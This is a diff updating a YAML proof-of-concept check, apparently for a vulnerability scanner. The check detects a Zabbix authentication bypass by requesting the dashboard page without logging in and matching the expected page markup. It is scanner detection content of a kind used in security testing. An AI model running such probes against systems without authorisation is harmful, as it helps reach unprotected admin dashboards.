@@ -1,11 +1,16 @@
 name: poc-yaml-zabbix-authentication-bypass
+manual: true
+transport: http
 rules:
-  - method: GET
-    path: /zabbix.php?action=dashboard.view&dashboardid=1
-    follow_redirects: false
-    expression: |
-      response.status == 200 && response.body.bcontains(bytes("<a class=\"top-nav-zbbshare\" target=\"_blank\" title=\"Zabbix Share\" href=\"https://share.zabbix.com/\">Share</a>")) && response.body.bcontains(b"<title>Dashboard</title>")
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /zabbix.php?action=dashboard.view&dashboardid=1
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes("<a class=\"top-nav-zbbshare\" target=\"_blank\" title=\"Zabbix Share\" href=\"https://share.zabbix.com/\">Share</a>")) && response.body.bcontains(b"<title>Dashboard</title>")
+expression: r0()
 detail:
-  author: FiveAourThe(https://github.com/FiveAourThe)
-  links:
-    - https://www.exploit-db.com/exploits/47467
+    author: FiveAourThe(https://github.com/FiveAourThe)
+    links:
+        - https://www.exploit-db.com/exploits/47467
